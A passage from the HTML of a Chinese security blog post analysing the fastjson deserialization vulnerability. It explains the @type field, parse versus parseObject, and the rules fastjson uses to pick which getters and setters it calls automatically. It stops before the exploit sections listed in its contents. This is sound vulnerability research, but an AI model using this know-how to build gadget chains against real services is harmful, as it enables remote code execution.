@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  
+  <title>【notes】浅谈fastjson反序列化漏洞 | 0kami&#39;s Blog</title>
+  <meta name="description" content="A Web 🐶 &amp;&amp; Code Reviewer">
+  <meta name="keywords" content>
+  <meta name="HandheldFriendly" content="True">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <link rel="shortcut icon" href="/images/avatar.jpg">
+  <link rel="alternate" href="/atom.xml" title="0kami's Blog">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x00 前言最近又碰上了fastjson的题目，想着是时候分析一波这个漏洞了，跟上师傅们的脚步。">
+<meta name="keywords" content="vul">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【notes】浅谈fastjson反序列化漏洞">
+<meta property="og:url" content="http://blog.0kami.cn/2020/04/13/talk-about-fastjson-deserialization/index.html">
+<meta property="og:site_name" content="0kami&#39;s Blog">
+<meta property="og:description" content="0x00 前言最近又碰上了fastjson的题目，想着是时候分析一波这个漏洞了，跟上师傅们的脚步。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/1564368830000-15632616584384.jpg">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200104200324167.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200104200849550.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200409201548997.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200106094637943.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200106105841139.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200106110005828.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200106110837420.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200410110654354.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200410110738399.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200410121100651.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200410122509759.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200411145506512.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200411145811138.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200411153340074.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200106232029570.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200106233142450.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200407105109680.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200407105258958.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200411132559759.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200411132736300.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200411134429055.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200411232403665.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200412223524510.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200412224904669.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200412232825982.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200412233730761.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200413114125856.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200413125108171.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200413130933666.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200413131026571.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200413131650373.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200413132337804.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200413132644597.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200413132704804.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200413134143022.png">
+<meta property="og:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/image-20200413161935377.png">
+<meta property="og:updated_time" content="2020-04-13T11:31:49.457Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【notes】浅谈fastjson反序列化漏洞">
+<meta name="twitter:description" content="0x00 前言最近又碰上了fastjson的题目，想着是时候分析一波这个漏洞了，跟上师傅们的脚步。">
+<meta name="twitter:image" content="http://blog.0kami.cn/assets/talk-about-fastjson-deserialization-20200413/1564368830000-15632616584384.jpg">
+
+  <link href="https://fonts.googleapis.com/css?family=Inconsolata|Titillium+Web" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
+  <link href="//cdn.bootcss.com/node-waves/0.7.5/waves.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/style.css">
+  <script>
+    function setLoadingBarProgress(num) {
+      document.getElementById('loading-bar').style.width=num+"%";
+    }
+  </script>
+</head>
+</html>
+<body>
+  <div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+
+
+  <script>setLoadingBarProgress(20)</script> 
+  <header class="l_header">
+	<div class='wrapper'>
+		<div class="nav-main container container--flex">
+			<a class="logo flat-box" href='/' >
+				0kami's Blog
+			</a>
+			<div class='menu'>
+				<ul class='h-list'>
+					
+						<li>
+							<a class='flat-box nav-home' href='/'>
+								Home
+							</a>
+						</li>
+					
+						<li>
+							<a class='flat-box nav-archives' href='/archives'>
+								Archives
+							</a>
+						</li>
+					
+						<li>
+							<a class='flat-box nav-about' href='/about'>
+								About
+							</a>
+						</li>
+					
+				</ul>
+				<div class='underline'></div>
+			</div>
+			
+				<div class="m_search">
+					<form name="searchform" class="form u-search-form">
+						<input type="text" class="input u-search-input" placeholder="Search" />
+						<span class="icon icon-search"></span>
+					</form>
+				</div>
+			
+			<ul class='switcher h-list'>
+				
+					<li class='s-search'><a href='javascript:void(0)'><span class="icon icon-search flat-box"></span></a></li>
+				
+				<li class='s-menu'><a href='javascript:void(0)'><span class="icon icon-menu flat-box"></span></a></li>
+			</ul>
+		</div>
+		
+		<div class='nav-sub container container--flex'>
+			<a class="logo" class="flat-box" href='javascript:void(0)'>
+				Word of Forks
+			</a>
+
+			<ul class='switcher h-list'>
+				<li class='s-comment'><a href='javascript:void(0)'><span class="icon icon-chat_bubble_outline flat-box"></span></a></li>
+				<li class='s-top'><a href='javascript:void(0)'><span class="icon icon-arrow_upward flat-box"></span></a></li>
+				<li class='s-toc'><a href='javascript:void(0)'><span class="icon icon-format_list_numbered flat-box"></span></a></li>
+			</ul>
+		</div>
+	</div>
+</header>
+<aside class="menu-phone">
+	<nav>
+		
+			<a href="/" class="nav-home nav">
+				Home
+			</a>
+		
+			<a href="/archives" class="nav-archives nav">
+				Archives
+			</a>
+		
+			<a href="/about" class="nav-about nav">
+				About
+			</a>
+		
+	</nav>
+</aside>
+
+    <script>setLoadingBarProgress(40);</script>
+  <div class="l_body">
+    <div class='container clearfix'>
+      <div class='l_main'>
+        <article id="post-talk-about-fastjson-deserialization"
+  class="post white-box article-type-post"
+  itemscope itemprop="blogPost">
+	<section class='meta'>
+	<h2 class="title">
+  	<a href="/2020/04/13/talk-about-fastjson-deserialization/">
+    	【notes】浅谈fastjson反序列化漏洞
+    </a>
+  </h2>
+	<time>
+	  Apr 13, 2020
+	</time>
+	
+    
+    <div class='cats'>
+        <a href="/categories/notes/">notes</a>
+    </div>
+
+	</section>
+	
+		<section class="toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-基础知识"><span class="toc-number">2.</span> <span class="toc-text">0x01 基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-fastjson的基础使用"><span class="toc-number">2.1.</span> <span class="toc-text">(1). fastjson的基础使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-fastjson的流程简介"><span class="toc-number">2.2.</span> <span class="toc-text">(2).fastjson的流程简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-fastjson-自动调用getter和setter"><span class="toc-number">2.3.</span> <span class="toc-text">(3).  fastjson 自动调用getter和setter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-parse-和-parseObject的区别"><span class="toc-number">2.3.1.</span> <span class="toc-text">1. parse 和 parseObject的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-parse自动调用函数的主要逻辑"><span class="toc-number">2.3.2.</span> <span class="toc-text">2. parse自动调用函数的主要逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-突破parse不能调用所有getters的限制"><span class="toc-number">2.3.3.</span> <span class="toc-text">3. 突破parse不能调用所有getters的限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一种：Tomcat-BCEL-POC思路"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">第一种：Tomcat BCEL POC思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第二种：-ref点"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">第二种：$ref点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-private属性"><span class="toc-number">2.4.</span> <span class="toc-text">(4). private属性</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-EXP分析"><span class="toc-number">3.</span> <span class="toc-text">0x02 EXP分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-templatesimpl"><span class="toc-number">3.1.</span> <span class="toc-text">(1). templatesimpl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-基于JNDI的利用"><span class="toc-number">3.2.</span> <span class="toc-text">(2). 基于JNDI的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">3.2.1.</span> <span class="toc-text">JdbcRowSetImpl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Tomcat-dbcp-BasicDataSource"><span class="toc-number">3.3.</span> <span class="toc-text">(3). Tomcat dbcp BasicDataSource</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-Fastjson历史版本修复措施"><span class="toc-number">4.</span> <span class="toc-text">0x03 Fastjson历史版本修复措施</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-fastjson-1-2-25"><span class="toc-number">4.0.1.</span> <span class="toc-text">(1). fastjson == 1.2.25</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#开启AutoType的情况下绕过黑名单检测"><span class="toc-number">4.0.1.1.</span> <span class="toc-text">开启AutoType的情况下绕过黑名单检测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-fastjson-1-2-42"><span class="toc-number">4.0.2.</span> <span class="toc-text">(2). fastjson == 1.2.42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-fastjson-1-2-43"><span class="toc-number">4.0.3.</span> <span class="toc-text">(3). fastjson == 1.2.43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-fastjson-1-2-48"><span class="toc-number">4.0.4.</span> <span class="toc-text">(4). fastjson == 1.2.48</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#修复前的版本"><span class="toc-number">4.0.4.1.</span> <span class="toc-text">修复前的版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#修复后的版本"><span class="toc-number">4.0.4.2.</span> <span class="toc-text">修复后的版本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-后续版本"><span class="toc-number">4.0.5.</span> <span class="toc-text">(5). 后续版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-后续版本觉得有意思的利用"><span class="toc-number">4.0.6.</span> <span class="toc-text">(6). 后续版本觉得有意思的利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-总结"><span class="toc-number">5.</span> <span class="toc-text">0x04 总结</span></a></li></ol></section>
+	
+	<section class="article typo">
+  	<div class="article-entry" itemprop="articleBody">
+    	<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近又碰上了fastjson的题目，想着是时候分析一波这个漏洞了，跟上师傅们的脚步。</p>
+<a id="more"></a>
+<h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h1><hr>
+<h2 id="1-fastjson的基础使用"><a href="#1-fastjson的基础使用" class="headerlink" title="(1). fastjson的基础使用"></a>(1). fastjson的基础使用</h2><blockquote>
+<p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p>
+</blockquote>
+<p>先来看一个简单的例子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String phoneNumber;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">(String phoneNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phoneNumber = phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewPhone</span> <span class="keyword">extends</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String location;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NewPhone</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NewPhone</span><span class="params">(String phoneNumber, String location)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phoneNumber = phoneNumber;</span><br><span class="line">        <span class="keyword">this</span>.location = location;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.phoneNumber+<span class="string">":"</span>+<span class="keyword">this</span>.location;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Phone phone;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, Phone phone)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name+<span class="string">":"</span>+phone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面包括了3个简单的对象Person、Phone以及NewPhone，我们用fastjson将Person对象转化成一个json字符串，并还原</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Phone phone = <span class="keyword">new</span> Phone(<span class="string">"1234567890"</span>);</span><br><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">"john"</span>, phone);</span><br><span class="line">String json = JSON.toJSONString(person);</span><br><span class="line">System.out.println(json);</span><br><span class="line">Person p = JSON.parseObject(json, Person.class);</span><br><span class="line">System.out.println(p);</span><br><span class="line"><span class="comment">// output </span></span><br><span class="line"><span class="comment">// &#123;"name":"john","phone":&#123;"phoneNumber":"1234567890"&#125;&#125;</span></span><br><span class="line"><span class="comment">// john:1234567890</span></span><br></pre></td></tr></table></figure>
+<p>调用fastjson的toJSONString可以轻易地将object转化为json字符串，也可以用parseObject将json字符串还原出来。但是这里有一个限制就是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Phone phone = <span class="keyword">new</span> NewPhone(<span class="string">"1234567890"</span>,<span class="string">"China"</span>);</span><br><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">"john"</span>, phone);</span><br><span class="line">String json = JSON.toJSONString(person);</span><br><span class="line">System.out.println(json);</span><br><span class="line">Person p = JSON.parseObject(json, Person.class);</span><br><span class="line">System.out.println(p);</span><br><span class="line"><span class="comment">// output</span></span><br><span class="line"><span class="comment">// &#123;"name":"john","phone":&#123;"location":"China","phoneNumber":"1234567890"&#125;&#125;</span></span><br><span class="line"><span class="comment">// john:1234567890</span></span><br></pre></td></tr></table></figure>
+<p>在上面的写法中，由于fastjson不知道需要还原的Person的Phone是本身还是子类NewPhone，面对这种多态方式，fastjson还原是父类，而不是子类NewPhone。这意味着我们丢失了Json字符串中phone的location字段。这显然是不可忍受的，所以fastjson给我们提供了指定还原类的字段<code>@type</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Phone phone = <span class="keyword">new</span> NewPhone(<span class="string">"1234567890"</span>,<span class="string">"China"</span>);</span><br><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">"john"</span>, phone);</span><br><span class="line">String json = JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line">System.out.println(json);</span><br><span class="line">Person p = JSON.parseObject(json, Person.class);</span><br><span class="line">System.out.println(p);</span><br><span class="line"><span class="comment">// output</span></span><br><span class="line"><span class="comment">// &#123;"@type":"org.vultest.base.Person","name":"john","phone":&#123;"@type":"org.vultest.base.NewPhone","location":"China","phoneNumber":"1234567890"&#125;&#125;</span></span><br><span class="line"><span class="comment">// john:1234567890:China</span></span><br></pre></td></tr></table></figure>
+<p>通过在toJSONString的时候指定SerializerFeature（SerializerFeature.WriteClassName），使得转化后的json字符串多了<code>@type</code>字段。这个字段指代了当前类的class，避免了上面的子类丢失字段的问题。比如上面直接指定了Person对象的phone属性的类是NewPhone，还原后成功打印出location。</p>
+<p>到了这里，我们可以思考一下，如果<code>@type</code>被指定为某恶意的类，是否会导致任意代码执行的漏洞？</p>
+<h2 id="2-fastjson的流程简介"><a href="#2-fastjson的流程简介" class="headerlink" title="(2).fastjson的流程简介"></a>(2).fastjson的流程简介</h2><blockquote>
+<p>这里直接参考<a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></p>
+</blockquote>
+<p>用一下廖大的流程图</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/1564368830000-15632616584384.jpg" alt="img"></p>
+<p>具体的分析过程看上面的那篇文章即可，这里提一下将ASM动态生成的代码dump出来的方法</p>
+<p>在分析过程中，ASM动态生成了相应的bytecodes，这里用idea的断点来dump源码</p>
+<p>先将断点下在<code>com/alibaba/fastjson/parser/deserializer/ASMDeserializerFactory.java#80</code></p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200104200324167.png" alt="image-20200104200324167"></p>
+<p>生成的bytecodes在code里，用执行表达式的功能，执行<code>(new FileOutputStream(&quot;some.class&quot;)).write(code)</code>即可生成</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200104200849550.png" alt="image-20200104200849550"></p>
+<h2 id="3-fastjson-自动调用getter和setter"><a href="#3-fastjson-自动调用getter和setter" class="headerlink" title="(3).  fastjson 自动调用getter和setter"></a>(3).  fastjson 自动调用getter和setter</h2><p>类似Java的反序列化过程会自动调用readObject函数，fastjson还原对象时也会自动调用以下几个函数：</p>
+<ul>
+<li>无参数的构造函数</li>
+<li>符合条件的getter函数</li>
+<li>符合条件的setter函数</li>
+</ul>
+<p>这里需要区别的是fastjson所使用的parse函数和parseObject函数所调用的函数条件是不一样的。（ps：序列化时会调用所有getters）</p>
+<h3 id="1-parse-和-parseObject的区别"><a href="#1-parse-和-parseObject的区别" class="headerlink" title="1. parse 和 parseObject的区别"></a>1. parse 和 parseObject的区别</h3><p>来看一下parseObject函数</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200409201548997.png" alt="image-20200409201548997"></p>
+<p>这里parseObject函数会首先调用<code>JSON.parse</code>函数，然后再去调用<code>toJSON</code>函数。</p>
+<p>这里<code>toJSON</code>会把obj套一层<code>JSONObject</code>对象，他的实现方法是先new一个<code>JSONObject</code>，把obj对象给填充进去；然后调用<code>toJSONString</code>把生成的<code>JSONObject</code>转化为json字符串；最后再调用<code>parse</code>函数将这个json字符串给还原。</p>
+<p>这里的<code>toJSONString</code>是我们序列化的一个过程，他会去调用这个对象的所有getters，也就意味着<code>parseObject</code>函数会主动去调getters和setters，而<code>parse</code>函数则会调用这个对象的setters和符合条件的getters(这部分见后文)。</p>
+<p>那么也就意味着，<code>parseObject</code>比<code>parse</code>函数多了一个调用所有getters的利用点。</p>
+<h3 id="2-parse自动调用函数的主要逻辑"><a href="#2-parse自动调用函数的主要逻辑" class="headerlink" title="2. parse自动调用函数的主要逻辑"></a>2. parse自动调用函数的主要逻辑</h3><p>接着我们来看一下<code>JSON.parse</code>函数自动调用getters和setters的逻辑。</p>
+<p>先来看一下调用流程，以下分析fastjson版本1.2.24</p>
+<p><code>com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java#deserialze</code>（ps：这里很鸡贼的把deserialize的i给省略了）</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200106094637943.png" alt="image-20200106094637943"></p>
+<p>首先是第570行调用了createInstance函数，该函数将会对当前还原的类进行实例化，这里会自动调用无参数的构造函数</p>
+<p>其次是第600行调用了parseField函数，该函数将对每个类属性进行初始化(或递归生成新的对象)</p>
+<p>跟进parseField函数</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200106105841139.png" alt="image-20200106105841139"></p>
+<p>这里调用了<code>com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java#parseField</code>函数，直接看关键点第83行，调用了setValue函数</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200106110005828.png" alt="image-20200106110005828"></p>
+<p>setValue函数就是fastjson自动调用getter和setter的关键点</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200106110837420.png" alt="image-20200106110837420"></p>
+<p>如果不存在相应的getter、setter、is函数，则利用反射机制将value赋值到当前的object上（这里就是else部分做的事情）。</p>
+<p>而当fieldInfo存在函数时，如果同时存在getter和setter，则调用setter，如果只存在getter则调用getter。</p>
+<p>这里我们关注一下fieldInfo的method是怎么填充的呢？这里要看<code>com/alibaba/fastjson/util/JavaBeanInfo.java#build</code>函数，ParserConfig在<code>createJavaBeanDeserializer</code>函数中会调用<code>JavaBeanInfo.build</code>函数，以此填充fieldInfo，也就是我们需要分析的几个method。</p>
+<p>不看具体的代码，写一下筛选的条件：</p>
+<p>setter提取条件：</p>
+<ul>
+<li>函数名长度大于等于4</li>
+<li>非静态函数</li>
+<li>限制返回类型为void或当前类</li>
+<li>函数参数只有一个</li>
+<li>函数名以set开头，第四个字符是大写或者<code>unicde</code>或者<code>_</code>或者字母f；如果函数名长度&gt;=5，看第5位字符是不是大写的</li>
+</ul>
+<p>getter提取条件：</p>
+<ul>
+<li>函数名长度大于等于4</li>
+<li>非静态函数</li>
+<li>函数名以get开头，第四个字符大写</li>
+<li>函数参数为0个</li>
+<li>函数的返回类型为Collection的子类或本身、Map的子类或本身、AtomicBoolean、AtomicInteger、AtomicLong</li>
+<li>无相对应的setter函数</li>
+</ul>
+<p>经过上述的两个条件提取后，保留了符合条件的getter和setter，并于<code>com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#setValue</code>函数中invoke调用，也就是说实现了类似反序列化过程中主动调用readObject函数的效果。</p>
+<p>知道了上述的条件，其实我们可以利用传入某字段的方式来主动调用相关符合条件的setter和getter。例如在Person里面添加一个setTest函数，并在需要转化的json中添加<code>&quot;test&quot;:1</code>，将会主动调用<code>setTest</code>。</p>
+<p>我们在利用<code>@type</code>构造有危害的利用链时，主要就是查找有危害的无参数的构造函数、符合条件的getter和setter。</p>
+<h3 id="3-突破parse不能调用所有getters的限制"><a href="#3-突破parse不能调用所有getters的限制" class="headerlink" title="3. 突破parse不能调用所有getters的限制"></a>3. 突破parse不能调用所有getters的限制</h3><p>这里的突破思路主要有两个：</p>
+<ol>
+<li>tomcat bcel的poc</li>
+<li>threedream师傅发现的<a href="https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6" target="_blank" rel="noopener">引用</a>的方式</li>
+</ol>
+<h4 id="第一种：Tomcat-BCEL-POC思路"><a href="#第一种：Tomcat-BCEL-POC思路" class="headerlink" title="第一种：Tomcat BCEL POC思路"></a>第一种：Tomcat BCEL POC思路</h4><p>这个poc巧妙的利用了<code>JSONObject.toString</code>函数，先来看看这个<code>toString</code></p>
+<p>这个<code>toString</code>继承自<code>JSON</code></p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200410110654354.png" alt="image-20200410110654354"></p>
+<p>这里他直接调用了<code>toJSONString</code>函数</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200410110738399.png" alt="image-20200410110738399"></p>
